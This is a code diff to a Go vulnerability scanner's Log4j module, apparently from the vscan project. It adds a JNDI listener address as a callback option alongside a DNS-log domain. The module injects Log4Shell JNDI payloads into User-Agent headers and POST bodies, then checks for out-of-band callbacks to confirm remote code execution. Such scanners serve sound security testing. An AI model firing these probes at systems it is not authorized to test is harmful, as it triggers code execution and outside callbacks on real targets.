@@ -3,20 +3,27 @@ package log4j
 import (
 	"fmt"
 	"github.com/veo/vscan/pkg"
+	"github.com/veo/vscan/pkg/jndi"
 	"net/url"
 	"regexp"
 	"strings"
 )
 
 func Check(u string, finalURL string) bool {
-	if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
+	if (pkg.CeyeApi != "" && pkg.CeyeDomain != "") || jndi.JndiAddress != "" {
 		randomstr := pkg.RandomStr() + "log4j"
 		domainx, intputs := getinputurl(finalURL)
 		domainx = append(domainx, u)
 		intputs = append(intputs, "x")
 		for _, domain := range domainx {
 			for _, payload := range log4jJndiPayloads {
-				payload = strings.Replace(payload, "dnslog-url", randomstr+"."+pkg.CeyeDomain, -1)
+				var uri string
+				if jndi.JndiAddress != "" {
+					uri = jndi.JndiAddress + "/" + randomstr + "/"
+				} else if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
+					uri = randomstr + "." + pkg.CeyeDomain
+				}
+				payload = strings.Replace(payload, "dnslog-url", uri, -1)
 				header := make(map[string]string)
 				header["Content-Type"] = "application/x-www-form-urlencoded"
 				header["User-Agent"] = payload
@@ -46,9 +53,17 @@ func Check(u string, finalURL string) bool {
 				_, _ = pkg.HttpRequset(domain, "POST", "{\""+strings.Join(intputs, "\":"+"\""+payload+"\""+",\"")+"\":\""+payload+"\"}", false, header)
 			}
 		}
-		if pkg.Dnslogchek(randomstr) {
-			pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
-			return true
+		if jndi.JndiAddress != "" {
+			if jndi.Jndilogchek(randomstr) {
+				pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
+				return true
+			}
+		}
+		if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
+			if pkg.Dnslogchek(randomstr) {
+				pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
+				return true
+			}
 		}
 	}
 	return false
